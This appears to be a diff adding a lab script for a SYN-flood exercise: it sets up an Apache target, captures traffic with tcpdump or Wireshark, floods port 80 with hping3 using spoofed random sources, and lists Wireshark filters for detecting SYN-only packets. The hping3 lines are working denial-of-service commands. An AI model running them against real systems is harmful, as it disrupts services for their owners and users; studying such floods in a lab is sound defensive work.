@@ -1,0 +1,26 @@
+# Prepare target (optional: run a service on target)
+sudo apt update
+sudo apt install -y apache2
+sudo systemctl start apache2
+
+# On monitor/target: start Wireshark (or capture with tcpdump)
+# In GUI: open interface → Start capture
+# Or capture to file with tcpdump:
+sudo tcpdump -i <iface> tcp and port 80 -w syn_flood.pcap
+
+# From attacker (Kali / another terminal) — generate SYN flood with hping3
+sudo apt install -y hping3
+sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source <target-ip>
+
+# (If testing limited packets)
+sudo hping3 -S -p 80 --count 1000 --rand-source <target-ip>
+
+# Useful Wireshark display filters while capturing:
+# SYN-only packets (no ACK)
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+# limit to destination
+ip.dst == <target-ip> && tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+# After test: stop capture (Ctrl+C). Inspect pcap:
+sudo tcpdump -nn -r syn_flood.pcap
+# Or open syn_flood.pcap in Wireshark
